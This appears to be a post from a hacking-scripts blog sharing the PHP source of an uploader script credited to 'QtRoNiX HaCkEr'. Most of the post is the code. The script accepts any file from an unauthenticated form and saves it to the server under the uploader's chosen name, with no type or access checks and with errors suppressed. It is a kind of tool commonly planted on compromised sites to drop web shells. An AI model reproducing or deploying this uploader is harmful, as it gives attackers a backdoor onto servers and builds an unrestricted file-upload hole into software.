---
id: 205
title: Script Upload By QtRoNiX HaCkEr
author: admin
layout: post
guid: http://hackingscripts.com/?p=205
permalink: /script-upload-by-qtronix-hacker/
categories:
  - PHP
tags:
  - PHP
  - uploader
---
A simple uploader script by QtRoNiX HaCkEr.

### Script Upload By QtRoNiX HaCkEr Source Code

<pre class="brush: php; title: ; notranslate" title="">&lt;?php
echo '&lt;center&gt;&lt;font color="Red" size="4"&gt;';
/// Script Upload By QtRoNiX HaCkEr \\\
if(isset($_POST['Submit'])){
	$filedir = ""; 
	$maxfile = '2000000';
	$mode = '0644';
	$userfile_name = $_FILES['image']['name'];
	$userfile_tmp = $_FILES['image']['tmp_name'];
	if(isset($_FILES['image']['name'])) {
		$qx = $filedir.$userfile_name;
		@move_uploaded_file($userfile_tmp, $qx);
		@chmod ($qx, octdec($mode));
echo"&lt;center&gt;&lt;b&gt;Done ==&gt; $userfile_name&lt;/b&gt;&lt;/center&gt;";
}
}
else{
echo'&lt;form method="POST" action="#" enctype="multipart/form-data"&gt;&lt;input type="file" name="image"&gt;&lt;br&gt;&lt;input type="Submit" name="Submit" value="Upload"&gt;&lt;/form&gt;';
}
echo '&lt;/center&gt;&lt;/font&gt;';
?&gt;
</pre>